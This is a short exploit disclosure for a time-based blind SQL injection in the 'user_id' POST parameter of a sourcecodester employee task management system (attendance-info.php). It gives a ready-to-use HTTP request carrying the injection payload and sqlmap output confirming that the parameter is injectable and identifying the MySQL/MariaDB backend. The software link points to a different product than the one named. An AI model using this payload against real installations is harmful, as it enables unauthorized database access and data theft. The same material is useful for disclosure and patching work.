# Exploit Title: employee task management system - SQLi

### Date: 
> March 15th, 2024

### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com

### Software Link:
> [employee task management system](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### URL:
> [/taskmatic/attendance-info.php](taskmatic/attendance-info.php)
### Proof of Concept:
Review source code
![SQL](https://github.com/tht1997/WhiteBox/blob/main/sourcecodesters/attendance-info.png?raw=true)
\
Step 1. Go to URL /attendance-info.php
\
Step 2. Run with sqlmap

```
POST /taskmatic/attendance-info.php HTTP/1.1
Content-Length: 193
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost
Referer: http://localhost/taskmatic/attendance-info.php
Cookie: PHPSESSID=au6ifo1ssaop7ilk8c4f09pj2j
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Connection: close

user_id=1'%20AND%20(SELECT%204052%20FROM%20(SELECT(SLEEP(10-(IF(VERSION()%20LIKE%200x254d61726961444225%2c0%2c5)))))gMfo)%20AND%20'uCzC'%3d'uCzC&add_punch_in=
```

Step 3. sqlmap result

```
[20:19:33] [INFO] POST parameter 'user_id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:19:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:19:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:19:44] [INFO] checking if the injection point on POST parameter 'user_id' is a false positive
[20:20:37] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
POST parameter 'user_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: user_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user_id=1' AND (SELECT 5903 FROM (SELECT(SLEEP(5)))hTDS) AND 'gCuQ'='gCuQ&add_punch_in=
---
[20:21:13] [INFO] the back-end DBMS is MySQL
[20:21:13] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Apache 2.4.54, PHP 7.4.30
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```
